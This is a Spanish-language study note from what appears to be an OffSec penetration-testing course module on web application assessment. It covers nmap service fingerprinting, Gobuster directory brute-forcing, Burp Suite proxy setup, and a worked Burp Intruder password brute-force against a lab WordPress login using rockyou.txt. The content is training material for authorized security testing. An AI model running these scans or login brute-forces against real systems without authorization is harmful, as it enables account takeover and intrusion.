---
id: 2025072801
tags:
  - Cibersecurity
  - Linux
  - Console
  - Offsec
type: permanent
author: Offsec
---
En este módulo, comenzaremos a presentar los ataques a aplicaciones web. Los frameworks y servicios de alojamiento modernos simplifican el proceso de creación e implementación de aplicaciones web. Sin embargo, estas aplicaciones exponen una amplia superficie de ataque debido a múltiples dependencias, configuraciones inseguras, bases de código incompletas y fallos específicos de la empresa.

Las aplicaciones web se desarrollan utilizando diversos lenguajes de programación y frameworks, cada uno de los cuales puede introducir tipos específicos de vulnerabilidades. Dado que las vulnerabilidades comunes son conceptualmente similares y los frameworks se comportan de forma similar independientemente de la pila tecnológica subyacente, podremos seguir vías de explotación similares.

---
## 8.1. Web Application Assessment Methodology

- Vamos a entender los requerimientos de seguridad para los test de aplicaciones web
- Aprender sobre los tipos y metodologías para los test de aplicaciones web
- Aprender sobre OWASP Top10 y las vulnerabilidades más comunes

### Metodologías de pruebas en aplicaciones web

La evaluación de aplicaciones web puede realizarse mediante tres enfoques, dependiendo del nivel de información entregado, el alcance definido y las reglas del compromiso:

1. **White-box testing (Caja blanca):**
    - Se tiene **acceso completo** al código fuente, infraestructura y documentación de diseño.
    - Requiere habilidades especializadas como:
        - Revisión de código fuente
        - Análisis de lógica de negocio
    - Ofrece una visión profunda de la aplicación.
    - El tiempo requerido depende del tamaño y complejidad del código evaluado.

2. **Black-box testing (Caja negra):**
    
    - También llamado **prueba de conocimiento cero**.
    - No se entrega ninguna información previa sobre la aplicación.
    - El pentester debe invertir **recursos significativos en enumeración** y recolección de información.
    - Común en programas de **bug bounty**.
    - Este es el enfoque adoptado en este módulo para desarrollar habilidades fundamentales.

3. **Grey-box testing (Caja gris):**
    
    - Se proporciona **información limitada**, como:
        - Métodos de autenticación
        - Credenciales
        - Detalles del framework
    - Mezcla elementos de caja blanca y negra.


### Enfoque del módulo

- Este módulo se centra en la **evaluación tipo black-box**.
- Se trabajará en **enumeración y explotación de vulnerabilidades** en aplicaciones web.

### OWASP Top 10

- [_OWASP Top 10 list_](https://owasp.org/www-project-top-ten/) publica periódicamente el **Top 10**, una lista de los **riesgos de seguridad más críticos** en aplicaciones web.
- Estas vulnerabilidades representan **vectores de ataque fundamentales**, sobre los cuales se construirán ataques más avanzados en módulos posteriores.

---

## 8.2. Web Application Assessment Tools


- Ejecutar técnicas comunes de **enumeración en aplicaciones web**    
- Comprender la teoría detrás de los **proxys web**
- Aprender cómo funciona **Burp Suite** como proxy para pruebas de seguridad en aplicaciones web

---

### Introducción a las herramientas de evaluación web

Antes de profundizar en la enumeración de aplicaciones web, es esencial conocer las herramientas clave utilizadas durante esta fase. En esta unidad se presentan herramientas fundamentales para realizar descubrimiento de tecnologías, estructuras y comportamientos de aplicaciones web:

#### 1. **Nmap**

- Herramienta de escaneo de red utilizada para enumerar servicios web.
- Permite identificar puertos abiertos (como 80 y 443) y versiones de servicios web (Apache, nginx, etc.).

#### 2. **Wappalyzer**

- Servicio en línea (y extensión de navegador) que identifica la **tecnología de backend** utilizada por una aplicación web:
    
    - Lenguaje de programación
    - Frameworks (como Laravel, React)
    - CMS, servidores, herramientas de análisis, etc.


#### 3. **Gobuster**

- Herramienta de fuerza bruta para descubrir:
    
    - **Directorios y archivos ocultos** en aplicaciones web        
    - Se utiliza con diccionarios (wordlists) personalizados     
    - Útil para identificar paneles de administración, archivos de configuración, endpoints no documentados

#### 4. **Burp Suite Proxy**

- Herramienta principal durante la evaluación de aplicaciones web en este curso.
- Actúa como **proxy HTTP/HTTPS** que intercepta, inspecciona y modifica el tráfico entre el navegador y el servidor web.
- Permite:
    
    - Manipular solicitudes y respuestas
    - Repetir ataques (repeater)
    - Automatizar escaneos y pruebas (scanner)
    - Realizar fuzzing o testing manual en formularios y parámetros

---

## 8.2.1. Fingerprinting Web Servers with Nmap

Nmap es una herramienta esencial para la **enumeración activa inicial** en pruebas de penetración. En el contexto de aplicaciones web, se comienza analizando el **servidor web**, ya que es el punto común en cualquier aplicación expuesta.

### Paso 1: Detección del servidor web con Nmap

- Se identificó que el **puerto 80 (HTTP)** está abierto.
- Se utilizó el escaneo de servicios con `-sV` para obtener información sobre el servidor web:
```bash
sudo nmap -p80 -sV 192.168.50.20


Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
Nmap scan report for 192.168.50.20
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

```



Resultado:

Servidor identificado: Apache httpd 2.4.41 (Ubuntu)

Esto nos brinda un punto de partida para investigar vulnerabilidades conocidas asociadas con esa versión.

### Paso 2: Fingerprinting detallado con script NSE

- Se utilizó el script http-enum, que realiza un escaneo específico de recursos y directorios comunes del servidor web:
```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
Nmap scan report for 192.168.50.20
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

**Resultado del script `http-enum`:**

- Detectó varios directorios potencialmente relevantes:
    - `/login.php`: posible acceso administrativo
    - `/db/`: contenido relacionado con bases de datos (_BlogWorx_)
    - `/css/`, `/images/`, `/js/`, `/uploads/`: directorios con listados habilitados        


Mediante el uso combinado de:

- `nmap -sV` (para detectar versión del servidor)
- `http-enum` (para descubrir rutas y recursos)

Se logró ampliar la **enumeración específica de la aplicación web**, identificando **archivos y directorios clave** que podrían contener vulnerabilidades o puntos de entrada para ataques posteriores.

Esta información sirve como base para fases siguientes como análisis de contenido, búsqueda de credenciales o explotación.

---

## 8.2.2. Technology Stack Identification with Wappalyze

Además de la enumeración activa realizada con Nmap, es posible obtener información valiosa de forma **pasiva** utilizando la herramienta **Wappalyzer**.

### Uso de Wappalyzer:

1. Se requiere crear una **cuenta gratuita** en el sitio oficial.
    
2. Con la cuenta registrada, se puede realizar un **Technology Lookup** sobre el dominio objetivo, por ejemplo:
```txt
megacorpone.com
```


![[Pasted image 20250728160837.png]]

### Resultados del análisis:

Wappalyzer proporciona un **análisis externo rápido** que revela detalles clave sobre la pila tecnológica de la aplicación web:

- **Sistema operativo del servidor**
- **Servidor web (e.g., Apache, nginx)**
- **Framework de interfaz (UI)**
- **Librerías JavaScript utilizadas**

### Importancia de la información obtenida:

- Conocer las tecnologías y versiones específicas ayuda a:    
    - **Identificar posibles vulnerabilidades conocidas**
    - Dirigir búsquedas de exploits o configuraciones inseguras
- Algunas **librerías JavaScript** (por ejemplo, jQuery, AngularJS) tienen versiones con **vulnerabilidades reportadas**, por lo que esta información puede ser **crítica** en fases posteriores de explotación.


---

## 8.2.3. Directory Brute Force with Gobuster

### Enumeración de archivos y directorios con Gobuster

Una vez identificada una aplicación web activa, el siguiente paso es **mapear todos los archivos y directorios accesibles públicamente**. Esto permite descubrir rutas ocultas que podrían contener vulnerabilidades o recursos expuestos.

---

### Herramienta: **Gobuster**

- Gobuster es una herramienta escrita en **Go** diseñada para realizar **fuerza bruta** sobre servidores web, utilizando **listas de palabras (wordlists)** para identificar:
    - **Directorios**
    - **Archivos**


---

### Advertencia:

- Debido a su naturaleza de fuerza bruta, Gobuster **genera tráfico considerable** y puede ser **demasiado ruidoso** para pruebas donde se requiere sigilo o baja visibilidad.


---

### Modos de funcionamiento:

- Gobuster ofrece varios modos, como:
    - **dir**: enumeración de directorios y archivos (enfocado en este módulo)
    - **dns**: descubrimiento de subdominios
    - **fuzz**: pruebas de fuzzing en rutas o parámetros

---

### Uso básico en modo `dir`:

Parámetros esenciales:
- `-u`: URL o IP del objetivo
- `-w`: ruta al **wordlist** que contiene posibles nombres de archivos/directorios
- `-t`: cantidad de hilos (threads). Por defecto usa 10, pero se puede reducir para disminuir el tráfico

**Ejemplo:**

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.20
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/images               (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]

===============================================================
2022/03/30 05:18:08 Finished
===============================================================
```

En la carpeta /usr/share/wordlists/dirb/, seleccionamos la lista de palabras common.txt, que encontró diez recursos. Cuatro de estos recursos son inaccesibles debido a privilegios insuficientes (estado: 403). Sin embargo, los seis restantes son accesibles y requieren mayor investigación.

---

## 8.2.4. Security Testing with Burp Suite

**Burp Suite** es una plataforma integrada con interfaz gráfica (GUI) diseñada para realizar **pruebas de seguridad en aplicaciones web**. Agrupa múltiples herramientas dentro de una misma interfaz, facilitando el análisis y la manipulación del tráfico web.

### Ediciones disponibles:

- **Community Edition (gratuita)**:
    - Contiene principalmente herramientas para **pruebas manuales**.
- **Ediciones comerciales**:
    - Incluyen funcionalidades adicionales como un **escáner automático de vulnerabilidades web** altamente eficaz.

### Características generales:

- Burp Suite ofrece una **amplia gama de funciones** útiles para pentesters y analistas de seguridad.
- En este módulo solo se explorarán **funcionalidades básicas**.

### Interceptación de tráfico HTTPS:

- Burp permite interceptar y modificar tráfico **HTTPS**, pero para ello es necesario instalar y confiar en el **certificado de Burp** en el navegador.
- La gestión del certificado está **fuera del alcance** de esta sección.

### Acceso en Kali Linux:

En Kali, Burp Suite Community Edition se encuentra en el siguiente menú:

Applications > 03 Web Application Analysis > burpsuite

![[Pasted image 20250728162436.png]]

### Ejecución de Burp Suite desde la terminal

Además de acceder a Burp Suite desde el menú gráfico de Kali, también se puede **iniciar desde la línea de comandos** con:

```bash
burpsuite
```

### Advertencia sobre Java Runtime Environment (JRE):

- Al iniciar Burp Suite por primera vez, puede aparecer una **advertencia indicando que no ha sido probado con el JRE actual**.
- Esta advertencia puede **ignorarse con seguridad en Kali Linux**, ya que la distribución incluye una versión de Java **compatibilizada y validada por el equipo de Kali** para trabajar correctamente con Burp Suite.

 ![[Pasted image 20250728163029.png]]

Una vez abierto vamos a seleccionar _Temporary project_ y luego click en _Next_.

![[Pasted image 20250728163109.png]]

 Seleccionamos _Use Burp defaults_  y damos click en _Start Burp_

Después de un rato nos cargará la UI

![[Pasted image 20250728163236.png]]

### Introducción a la herramienta Proxy en Burp Suite

Al iniciar Burp Suite, los **cuatro paneles iniciales** están orientados a la funcionalidad de escaneo de la versión **Pro**, por lo que en la edición **Community** pueden ignorarse. En su lugar, se debe enfocar la atención en las **pestañas superiores**, especialmente en la pestaña **Proxy**, que contiene herramientas esenciales para pruebas manuales.


### ¿Qué es un proxy web?

Un **proxy web** es una solución (software o hardware) que intercepta el tráfico entre el **cliente web (navegador)** y el **servidor web**. Esta intermediación permite:

- Inspeccionar solicitudes y respuestas
- Modificarlas manual o automáticamente
- Observar el comportamiento del servidor ante datos manipulados

### Proxies avanzados: TLS Inspection

- Algunos entornos corporativos utilizan **dispositivos de inspección TLS**, los cuales:
    - Interceptan el tráfico cifrado HTTPS
    - Lo descifran, analizan y vuelven a cifrar
    - Esto **elimina la privacidad real del canal HTTPS**

### Funcionalidad del Proxy en Burp Suite:

- Permite **interceptar solicitudes salientes del navegador** antes de que lleguen al servidor.
- Se pueden modificar diversos aspectos de la solicitud:
    - Nombres y valores de parámetros
    - Cuerpos de formularios
    - Encabezados HTTP (headers)

- Esto es útil para probar cómo una aplicación responde a entradas **inesperadas o maliciosas**.

**Ejemplo**:

- Un campo con límite de 20 caracteres puede ser modificado con Burp para enviar **30 caracteres**, lo que puede revelar fallos de validación o desbordamientos.

---

### Configuración inicial del Proxy:

1. Hacer clic en la pestaña **Proxy** para ver los sub menús.    
2. Ir a la sub pestaña **Intercept**.    
3. **Desactivar temporalmente el modo Intercept** para navegar sin interrupciones.

### Consejos sobre el uso de Intercept:

- Con **Intercept activado**, cada solicitud debe ser aprobada manualmente con el botón **Forward** o descartada con **Drop**.
- Esto es útil para modificar tráfico, pero puede resultar **tedioso al navegar normalmente**.
- Por ello, se recomienda desactivarlo durante el reconocimiento pasivo o navegación común y **activarlo solo cuando se necesite interceptar y modificar solicitudes específicas**.

![[Pasted image 20250728163522.png]]

A continuación, podemos revisar la configuración del receptor de proxy. La sub pestaña "Options" muestra qué puertos están escuchando las solicitudes de proxy.

![[Pasted image 20250728163558.png]]

### Configuración del navegador Firefox para usar Burp Suite como proxy

Por defecto, **Burp Suite activa un proxy listener** en la dirección `localhost:8080`. Para redirigir el tráfico web a través de Burp, el navegador debe estar configurado para conectarse a ese **host y puerto**.

### Nota sobre el navegador integrado

- Burp ahora incluye su **propio navegador basado en Chromium**, pre configurado para usar todas sus funciones.
- Sin embargo, en este curso se utilizará **Firefox en Kali Linux**, ya que ofrece una solución **más flexible y modular** para pruebas personalizadas.

### Configuración de Firefox en Kali:

1. En la barra de direcciones de Firefox, ingresar:
```txt
about:preferences#general
```

2. Desplazarse hacia abajo hasta Network Settings (Configuración de red) y hacer clic en Settings.

3. Seleccionar la opción Manual proxy configuration.

4. Configurar los siguientes valores:

    HTTP Proxy: 127.0.0.1
    Port: 8080

5. Marcar la opción "Use this proxy server for all protocols" para asegurar que Burp intercepte todo el tráfico web, incluyendo HTTPS, FTP, etc.

### Escenarios alternativos:

- Si se desea interceptar tráfico desde **otras máquinas en la red**, Burp debe configurarse para escuchar en una **IP externa** (no el loopback).
- En ese caso, el navegador en los dispositivos remotos debe apuntar a la **IP del proxy Burp en la red** y al puerto correspondiente (por ejemplo, `192.168.50.10:8080`).

Esta configuración es esencial para que **Burp Proxy** funcione correctamente como intermediario entre el navegador y las aplicaciones web objetivo, permitiendo inspección, modificación y prueba de solicitudes HTTP/HTTPS.

![[Pasted image 20250728163928.png]]

Con Burp configurado como proxy en nuestro navegador, podemos cerrar cualquier pestaña de Firefox que tengamos abierta y acceder a http://www.megacorpone.com. Deberíamos encontrar el tráfico interceptado en Burp Suite, en Proxy > Historial HTTP.

### Revisión del tráfico HTTP en Burp Suite

Una vez configurado el navegador para usar Burp como proxy, podemos comenzar a **navegar por el sitio objetivo** y observar en Burp todas las solicitudes generadas por el navegador.

### Visualización del tráfico:

- Todas las solicitudes y respuestas HTTP se registran en la pestaña **HTTP History** del módulo **Proxy**.
- A medida que se accede a nuevas páginas o recursos (como imágenes, scripts, formularios), Burp muestra nuevas entradas en la lista de solicitudes.

### Advertencia importante:

- Si el navegador **queda colgado o no carga las páginas**, es posible que la opción **Intercept esté activada**.
    - Solución: ir a la pestaña **Intercept** y hacer clic en **"Intercept is on"** para desactivarla.
    - Esto permite que el tráfico fluya sin necesidad de aprobación manual.

### Análisis de solicitudes:

- Al **seleccionar una solicitud** en la pestaña HTTP History, Burp muestra en la mitad inferior de la interfaz:
    - El **contenido completo de la solicitud enviada por el cliente** (navegador)
    - La **respuesta completa del servidor**
- Esta vista detallada es esencial para:
    - Inspeccionar parámetros enviados
    - Ver encabezados HTTP
    - Analizar la estructura de formularios, cookies, y tokens


Esta funcionalidad convierte a Burp Suite en una herramienta poderosa para analizar en profundidad el comportamiento de las aplicaciones web frente a entradas controladas, y es fundamental en todas las etapas del testing web.

![[Pasted image 20250728164115.png]]

### Inspección detallada de tráfico HTTP en Burp Suite

En Burp Suite, al seleccionar una solicitud dentro de **Proxy > HTTP History**, se despliega una vista dividida:

- **Panel izquierdo**: muestra los **detalles de la solicitud** enviada por el cliente (navegador).
- **Panel derecho**: muestra la **respuesta del servidor**.

Esta funcionalidad permite **inspeccionar cada elemento del tráfico web** de forma precisa y se usará frecuentemente en los próximos módulos.

### Tip: solicitudes recurrentes a `detectportal.firefox.com`

- Este dominio aparece constantemente en el historial del proxy.    
- Se trata de una verificación de **portal cautivo**, que Firefox usa para detectar si el usuario está detrás de una página de autenticación (como en redes Wi-Fi públicas).
#### Cómo desactivarlo:

1. Ingresar `about:config` en la barra de direcciones de Firefox.
2. Aceptar el riesgo si se solicita.
3. Buscar la clave:
```txt
network.captive-portal-service.enabled
```
   
4. Hacer doble clic y cambiar su valor a `false`.

Esto evitará que las solicitudes automáticas a `detectportal.firefox.com` sigan apareciendo en **HTTP History**.

### Herramienta complementaria: **Repeater**

Además del proxy, Burp Suite ofrece **Repeater**, una herramienta fundamental para:

- Crear nuevas solicitudes manualmente
- Modificar solicitudes previamente capturadas
- Reenviarlas múltiples veces
- Analizar las respuestas del servidor en distintas condiciones

#### Cómo utilizar Repeater:

- Hacer clic derecho sobre una solicitud en **Proxy > HTTP History**
- Seleccionar **Send to Repeater**

Esto permite experimentar y validar cómo reacciona la aplicación web ante solicitudes personalizadas, ideal para pruebas de seguridad como inyecciones, manipulación de parámetros, o validación de entradas.

![[Pasted image 20250728164402.png]]

Si hacemos clic en Repetidor, veremos una subpestaña con la solicitud a la izquierda de la ventana. Podemos enviar varias solicitudes al Repetidor y las mostrará en pestañas separadas. Enviemos la solicitud al servidor haciendo clic en _Send_.

![[Pasted image 20250728164441.png]]

Burp Suite mostrará la respuesta del servidor sin procesar en el lado derecho de la ventana, que incluye los encabezados de respuesta y el contenido de la respuesta sin procesar.

### Burp Suite – Herramienta Intruder y configuración previa

La última herramienta que se cubre en esta unidad es **Intruder**, la cual se utiliza para automatizar pruebas como fuerza bruta, fuzzing y manipulación masiva de parámetros. Antes de usarla, es necesario realizar una configuración local en Kali para asegurar el acceso correcto al sitio objetivo.


### Configuración del archivo `/etc/hosts`

Algunas aplicaciones web incluyen su **nombre de host (hostname)** en enlaces internos o redirecciones. Si el sistema local no puede resolver ese nombre, el navegador y herramientas como Burp Suite **no podrán seguir esas rutas** correctamente.

#### Solución:

Agregar una entrada manual en el archivo `/etc/hosts` para asociar el nombre de host con la IP del objetivo.

**Ejemplo:**

Si el objetivo se llama `offsecwp` y su IP es `192.168.50.20`, se debe agregar la siguiente línea en `/etc/hosts`:

```bash
nano /etc/hosts
192.168.50.20  offsecwp
```

### Ventajas de esta configuración:

- Permite acceder a la aplicación mediante su **hostname**, sin depender de DNS.
- Asegura que el navegador y Burp puedan **seguir enlaces o redirecciones internas** que incluyan ese nombre.
- Evita errores al procesar respuestas HTTP que contienen rutas absolutas con nombres de dominio.

Una vez configurado correctamente, se podrá utilizar **Burp Intruder** para lanzar pruebas automatizadas contra la aplicación usando el hostname como punto de entrada válido.


### Burp Suite – Funcionalidad de Intruder

La herramienta **Intruder** en Burp Suite está diseñada para **automatizar ataques web**, desde pruebas simples hasta ataques más avanzados. Es especialmente útil para tareas como:

- Fuerza bruta de contraseñas
- Fuzzing de parámetros
- Identificación de inyecciones o validaciones defectuosas

### Ejercicio práctico: fuerza bruta de contraseñas

#### Paso 1: Preparar entorno

- Iniciar una nueva **sesión en Burp Suite**
- Configurar el **Proxy** como se explicó anteriormente
- En Firefox, navegar a: **http://offsecwp/wp-login.php**

#### Paso 2: Capturar una solicitud de inicio de sesión

- En el formulario de login:
    - Usuario: `admin`
    - Contraseña: `test`
- Hacer clic en **Log in**
- Burp Proxy interceptará la solicitud de autenticación enviada al servidor

Esta solicitud capturada servirá como base para lanzar el ataque automatizado con **Intruder**, donde se reemplazarán los valores del usuario o contraseña con listas de prueba para simular un ataque de fuerza bruta. En los pasos siguientes se configurarán las posiciones y las cargas útiles.

![[Pasted image 20250728164924.png]]

Volviendo a Burp, navegaremos a _Proxy_ > _HTTP History_, haremos clic derecho en la solicitud POST a /wp-login.php y seleccionaremos _Send to Intruder_.

![[Pasted image 20250728165135.png]]

Una vez capturada la solicitud de inicio de sesión en Burp (desde Proxy > HTTP History), se procede a configurar el ataque con **Intruder**.


### Pasos para preparar Intruder:

1. Ir a la pestaña **Intruder** en la barra superior de Burp Suite.
2. Seleccionar la solicitud **POST** correspondiente al formulario de login.
3. Ir a la sub-pestaña **Positions**.

---

### Configuración de posiciones:

- Por defecto, Burp marcará automáticamente múltiples parámetros como posiciones de ataque (usando `§`).
- Como ya sabemos que el **nombre de usuario `admin` es correcto**, no necesitamos modificarlo.

#### Procedimiento:

1. Hacer clic en el botón **Clear** en el panel derecho para eliminar todas las posiciones automáticas.
2. Localizar el parámetro `pwd` (campo de contraseña) en la solicitud.
3. Seleccionar solamente el **valor de `pwd`** (ej., `test`).
4. Presionar el botón **Add** para marcar este valor como **posición de ataque**.


Esto permite que Intruder sustituya únicamente el valor de la contraseña con diferentes entradas de una lista, manteniendo fijo el nombre de usuario. En los siguientes pasos se definirá la carga útil (wordlist) que se usará para la fuerza bruta.

![[Pasted image 20250728165243.png]]

### Definición de cargas útiles (payloads) en Intruder

Una vez configurada la posición de ataque (el valor del campo `pwd`), se debe definir la **lista de palabras** que Burp Suite Intruder utilizará para generar las solicitudes.


### Selección de wordlist:

- Sabemos que la contraseña correcta es `"password"`.
- Usaremos los **primeros 10 valores** del archivo `rockyou.txt`, una de las wordlists más utilizadas en ataques de fuerza bruta, incluida por defecto en Kali Linux.

#### Comando para extraer los valores:

```bash
cat /usr/share/wordlists/rockyou.txt | head
```

Cuando vayamos a _Payloads_ sub-tab, podremos pegar la lista de palabras anterior denbtro del area _Payload Options: [Simple list]_.

![[Pasted image 20250728165522.png]]

Una vez configuradas las posiciones y la carga útil (wordlist), se puede proceder a **iniciar el ataque de fuerza bruta** con Burp Suite Intruder.

### Iniciar el ataque:

1. Hacer clic en **Start Attack**, ubicado en la parte superior derecha de la interfaz de Intruder.
2. Burp Suite mostrará una advertencia indicando que algunas funciones están restringidas en la **Community Edition**.
    - Esta advertencia puede **ignorararse con seguridad**, ya que no afecta la ejecución del ataque actual.

### Resultados del ataque:

- Burp ejecutará:
    - 1 solicitud de prueba inicial
    - **10 solicitudes adicionales**, una por cada entrada del archivo `top10.txt` (derivado de la wordlist `rockyou.txt`)
- Cada solicitud reutiliza el usuario `"admin"` e inserta una contraseña distinta del listado.

### Observación y análisis:

- Una vez finalizado, Intruder mostrará todas las solicitudes junto con columnas como:
    - **Status**: código de respuesta HTTP (e.g., 200, 302)
    - **Length**: longitud de la respuesta (útil para detectar diferencias)
- Un cambio en el código de estado o longitud puede indicar un **intento exitoso de autenticación**.

![[Pasted image 20250728165621.png]]

Observaremos que la aplicación de WordPress respondió con un código de estado diferente en la cuarta solicitud, lo que sugiere que esta podría ser la contraseña correcta. Nuestra hipótesis se confirma al intentar iniciar sesión en la consola administrativa de WordPress con la contraseña descubierta.

![[Pasted image 20250728165647.png]]

### Precaución al usar Firefox con Burp Suite

Cuando se configura **Firefox para usar Burp Suite como proxy**, todo el tráfico HTTP(S) pasa a través de Burp (por defecto, a través de `127.0.0.1:8080`).  
**Advertencia importante:**  
Si **cerramos Burp** mientras Firefox sigue configurado para usar ese proxy, el navegador **dejará de funcionar correctamente**, ya que no podrá enrutar las solicitudes.

### Próximo paso: enumeración de aplicaciones web

Con el conocimiento ya adquirido sobre:

- Configuración del proxy en Firefox
- Uso de herramientas como:
    - **Nmap** (para descubrimiento y fingerprinting de servicios web)
    - **Wappalyzer** (para análisis pasivo del stack tecnológico)
    - **Gobuster** (para fuerza bruta de directorios/archivos)
    - **Burp Suite** (para análisis e interacción avanzada con aplicaciones web)

---

## 8.3. Web Application Enumeration

En este modulo aprenderemos a como depurar código fuente de las aplicaciones web, entender como enumerar e inspeccionar cabeceras, cookies y código fuente y, finalmente entender como realizar pruebas a apis

En el modulo anterior aprendimos como la obtención de información pasiva juega un rol critico cuando mapeamos aplicaciones web, especialmente en repositorios públicos o en google dorks que nos dan información sensible de nuestro objetivo.

Es importante identificar cuales son los componentes tecnológicos de la aplicación web antes de inicializar un ataque. Muchas de las aplicaciones web son tecnológicamente agnósticas, sin embargo, muchos de estos exploits o payloads necesitan ser construidos basados en la infraestructura tecnológica de la aplicación, como el software de las bases de datos o el sistema operativo.
Antes de lanzar cualquier ataque debemos identificar el stack tecnológico que se utiliza, generalmente estas constan de un sistema operativo anfitrión,  software de servidor web, software de base de datos y un lenguaje de programación frontend y backend

Una vez que hayamos enumerado la pila subyacente utilizando las metodologías aprendidas anteriormente, pasaremos a la enumeración de la aplicación.

Podemos aprovechar diversas técnicas para recopilar esta información directamente del navegador. La mayoría de los navegadores modernos incluyen herramientas para desarrolladores que facilitan el proceso de enumeración.

## 8.3.1. Debugging Page Content

### Inspección de URLs y código fuente en la enumeración web

Un buen punto de partida para mapear una aplicación web es analizar su **URL**. Algunas **extensiones de archivos** visibles en las URLs pueden revelar el lenguaje de programación subyacente:

- Ejemplos comunes:

    - `.php` → PHP
    
    - `.jsp`, `.do` → aplicaciones Java

    - `.html` → puede ser estático o dinámico


Sin embargo, el uso de extensiones en URLs **ha disminuido**, ya que muchos lenguajes y frameworks modernos utilizan **ruteo lógico (routes)**, donde la URI se asigna internamente a funciones sin depender de extensiones visibles. Esto dificulta deducir la tecnología desde la URL.


### Inspección del código fuente con Firefox

Más allá de las URLs, gran parte del contexto útil se encuentra en el **código fuente** de la página web. Para examinarlo, se puede usar la herramienta **Debugger** de Firefox (accesible desde el menú **Web Developer**), que permite:

- Ver recursos cargados por la página
- Identificar **frameworks JavaScript**
- Detectar **campos ocultos**, comentarios, scripts, y controles del lado cliente

### Ejemplo práctico:

Para aplicar este enfoque, se propone abrir la herramienta **Debugger** en Firefox mientras se navega por la aplicación `offsecwp`, con el fin de analizar su estructura, recursos y lógica cliente.

![[Pasted image 20251117185101.png]]

Con esto podemos ver que el desarrollador uso jquery version 3.6.0, una libreria comun de javascript (sobretodo en proyectos legacy). En este caso tenemos el codigo en estado minimizado, esto normalmente se usa para gestionar y reducir recursos a nivel de ejecucion, pero podemos ordenarlo con el boton prettier que nos da firefox

![[Pasted image 20251124091316.png]]

Despues de oprimir este boton el codigo se organizara para que sea mucho mas facil de leerlo.

![[Pasted image 20251124091354.png]]

Podemos usar la herramienta de inspector con un elemento especifico de la pagina, este inspector podemos desplegarlo con f12 o con click derecho y seleccionando inspector

![[Pasted image 20251124091528.png]]

Esto abrira el *Html* de la pagina y resaltara el elemento que seleccionamos anteriormente.
![[Pasted image 20251124091614.png]]

Esta herramienta es especialmente util para encontrar rapidamente elementos ocultos en el aplicativo web

## 8.3.2. Inspecting HTTP Response Headers and Sitemaps

Podemos revisar las respuestas del servidor para obtener informacion adicional. Aqui tenemos dos tipos de herramientas que podemos usar, la primera es un proxy como burp suite, el cual intercepta peticiones y respuestas entre cliente y servidor, y el otro es la herramienta de network del navegador.

En este modulo exploraremos ambas herramientas, podemos empezar con la herramienta Network del navegador. Esta se despliega con f12 o con click derecho inspect, luego seleccionamos el apartado de network y alli podremos ver las peticiones y respuestas realizadas al servidor.

![[Pasted image 20251124092536.png]]

Cuando damos click a la peticion podemos ver informacion adicional, en este caso estamos interesados en la respuesta de las cabeceras
![[Pasted image 20251124092917.png]]

Aqui podemos ver informacion de la peticion pero principalmente, podemos ver que el servidor backend es un apache con debian con version 2.4.51  

TIP: Los encabezados HTTP no siempre son generados únicamente por el servidor web. Por ejemplo, los proxies web insertan activamente el encabezado X-Forwarded-For para indicar al servidor web la dirección IP del cliente original.

Históricamente, las cabeceras que comenzaban con "X-" se llamaban cabeceras HTTP no estándar. Sin embargo, la RFC6648 ahora desaprueba el uso de "X-" a favor de una convención de nomenclatura más clara.

Los nombres o los valores de las cabeceras de respuesta pueden revelar informacion adicional sobre el stack tecnologico usado en la aplicacion. Algunos ejemplos de cabeceras non-standard inlcuyen _X-Powered-By_, _x-amz-cf-id_, and _X-Aspnet-Version_. Una busqueda dentro de ellos puede revelar informacion adicional como la cabecera "x-amz-cf-id", la cual indica que la aplicacion usa amazon cloudfront.

Los sitemaps son otro elemento importante que debemos tener en cuenta a la hora de enumerar aplicaciones web.

Las aplicaciones web pueden incluir archivos de sitemap para ayudar a los motores de búsqueda a rastrear e indexar sus sitios. Estos archivos también incluyen directivas de qué URLs no rastrear - típicamente páginas sensibles o consolas administrativas, que son exactamente el tipo de páginas en las que estamos interesados.

Las directivas inclusivas se realizan con el protocolo [_sitemaps_](https://www.sitemaps.org/), mientras que robots.txt excluye URLs de ser rastreadas.

```bash
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

Las directivas Permitir y Desautorizar informan a los rastreadores web "educados" sobre qué páginas o directorios pueden ser accedidos o deben ser evitados. En la mayoría de los casos, las páginas y directorios listados pueden no ser interesantes, y algunos incluso pueden ser inválidos. Sin embargo, los archivos de sitemaps no deben pasarse por alto porque pueden contener pistas sobre el diseño del sitio web u otra información interesante, como porciones aún inexploradas del objetivo.

---

